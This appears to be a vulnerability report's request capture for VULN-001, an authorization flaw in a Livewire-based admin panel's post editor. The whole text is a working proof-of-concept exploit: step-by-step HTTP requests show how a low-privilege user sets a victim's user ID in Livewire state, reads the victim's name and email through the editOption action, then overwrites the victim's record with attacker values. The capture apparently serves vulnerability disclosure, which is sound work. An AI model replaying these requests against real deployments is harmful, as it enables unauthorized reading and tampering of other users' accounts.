### VULN-001 — decisive requests. Full capture in response.txt / run.log.
### data.author_id is public Livewire state. editOption resolves the record via
### Relation::noConstraints filtered by the client PK alone, with NO ->authorize().

### 1) Snapshot — Post edit page (authed low-priv user). author Select has editOptionForm.
GET /admin/posts/1/edit HTTP/1.1
Host: localhost:21890

### 2) READ: point the Select at a victim user PK and mount the editOption action
POST /livewire/update  (updates: {"data.author_id": <victim_id>};
  calls: mountAction "editOption" {} {"recordKey":"1","schemaComponent":"form.author_id"})
### → the mounted modal is filled with getSelectedRecord()->attributesToArray()
###   (the victim's name/email appear in the returned snapshot) = cross-user READ

### 3) WRITE: submit the modal with attacker values
POST /livewire/update  (updates: {"mountedActions.0.data.name":"PWNED ...",
  "mountedActions.0.data.email":"pwned_...@attacker.invalid"}; calls: callMountedAction)
### → default updateOptionUsing runs $record->update($data) on the VICTIM row = cross-user WRITE
